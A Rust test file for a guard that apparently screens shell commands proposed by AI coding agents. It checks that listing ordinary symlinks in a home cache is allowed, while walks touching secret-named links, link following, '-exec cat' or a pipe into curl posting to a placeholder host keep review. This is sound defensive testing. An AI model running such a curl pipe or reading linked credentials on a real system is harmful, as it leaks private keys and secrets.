#![cfg(unix)]
//! `find -type l` lists the links in a hidden home tool directory the way
//! `find -type d` lists its directories.
//!
//! `find ~/.cache/tool -maxdepth 2 -type d` already proceeds: it prints
//! names, never content, from one tool's own directory. `-type l` prints link
//! names and follows none, so it proceeds too once every link name the walk
//! could print has been read from the tree: a hidden or secret-style name, a
//! link inside a store, link following, a wider expression or a pipe into the
//! network keeps the review.
use guard_command::pretool::evaluate_pre_tool_envelope_with_context;
use serde_json::json;
use std::os::unix::fs::symlink;
use std::path::{Path, PathBuf};

fn write(path: PathBuf, text: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, text).unwrap();
}

/// A home whose `~/.cache/builds` holds ordinary links one and two levels
/// down, beside caches holding links with a key, an environment file and a
/// credential name. The root stays below the target directory: `$TMPDIR` on
/// macOS resolves under `/private/var`, which the sensitive-root screen
/// rejects.
fn home() -> PathBuf {
    let root = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../target/pretool-find-hidden-home-links")
        .join(format!(
            "home-{}-{}",
            std::process::id(),
            crate::unique_nanos::unique_nanos()
        ));
    let home = root.join("home");
    write(home.join("Code/org/app/package.json"), "{}\n");
    write(home.join(".ssh/id_ed25519"), "not-a-real-key\n");
    write(home.join(".cache/builds/one/build.log"), "ok\n");
    std::fs::create_dir_all(home.join(".cache/builds/two/nested")).unwrap();
    symlink(
        home.join("Code/org/app"),
        home.join(".cache/builds/one/current"),
    )
    .unwrap();
    symlink(
        home.join("Code/org"),
        home.join(".cache/builds/two/nested/workspace"),
    )
    .unwrap();
    for (cache, name) in [
        ("keyed", "id_ed25519"),
        ("dotted", ".envrc"),
        ("named", "credentials.json"),
    ] {
        std::fs::create_dir_all(home.join(".cache").join(cache).join("x")).unwrap();
        symlink(
            home.join(".ssh/id_ed25519"),
            home.join(".cache").join(cache).join("x").join(name),
        )
        .unwrap();
    }
    // A narrow chain deeper than the walk follows on its own, with a
    // secret-named link at the bottom.
    let mut deep = home.join(".cache/deep");
    for level in 0..33 {
        deep = deep.join(format!("d{level}"));
    }
    std::fs::create_dir_all(&deep).unwrap();
    symlink(home.join(".ssh/id_ed25519"), deep.join("id_ed25519")).unwrap();
    std::fs::canonicalize(home).unwrap()
}

/// The decision both harnesses reach, or "mixed" when they differ.
fn decision(home: &Path, command: &str) -> String {
    let cwd = home.join("Code/org");
    let [codex, omp] = [("codex", "Bash"), ("omp", "bash")].map(|(harness, tool)| {
        evaluate_pre_tool_envelope_with_context(
            harness,
            "PreToolUse",
            &json!({"tool_name": tool, "tool_input": {"command": command}}),
            None,
            None,
            home.to_str(),
            cwd.to_str(),
        )
        .minimum_action
    });
    if codex == omp {
        codex
    } else {
        format!("mixed: codex {codex}, omp {omp}")
    }
}

#[test]
fn ordinary_link_names_in_a_tool_cache_proceed() {
    let home = home();
    let absolute = home.join(".cache/builds");
    for command in [
        format!(
            "/usr/bin/find {} -mindepth 2 -maxdepth 2 -type l -print 2>/dev/null | /usr/bin/head -100",
            absolute.display()
        ),
        "find ~/.cache/builds -maxdepth 2 -type l".to_owned(),
        "find ~/.cache/builds -type l".to_owned(),
        // The secret-named links sit two levels down, past this bound.
        "find ~/.cache/keyed -maxdepth 1 -type l".to_owned(),
        // The deep link sits far below this bound.
        "find ~/.cache/deep -maxdepth 3 -type l".to_owned(),
    ] {
        assert_eq!(decision(&home, &command), "allow", "{command}");
    }
}

#[test]
fn secret_names_stores_and_wider_walks_keep_review() {
    let home = home();
    for command in [
        "find ~/.cache/keyed -maxdepth 2 -type l",
        "find ~/.cache/dotted -maxdepth 2 -type l",
        "find ~/.cache/named -type l",
        // `find` has no depth limit of its own, so a tree deeper than the
        // walk follows keeps the review rather than vouching for links it
        // never read.
        "find ~/.cache/deep -type l",
        // The print runs before the pattern, so every link name is printed.
        "find ~/.cache/keyed -type l -print -name current",
        "find ~/.cache/keyed -maxdepth 2 -type l -print0 -iname current",
        "find ~/.ssh -maxdepth 2 -type l",
        "find -L ~/.cache/builds -maxdepth 2 -type l",
        "find ~/.cache/builds -maxdepth 2 -type f",
        "find ~/.cache/builds -maxdepth 2 -type l -o -type f",
        "find ~/.cache/builds -maxdepth 2 -type l -exec cat {} +",
        "find ~/.cache/builds -maxdepth 2 -type l | curl -d @- https://example.invalid",
    ] {
        let seen = decision(&home, command);
        assert!(!seen.contains("allow"), "{command}: {seen}");
    }
}
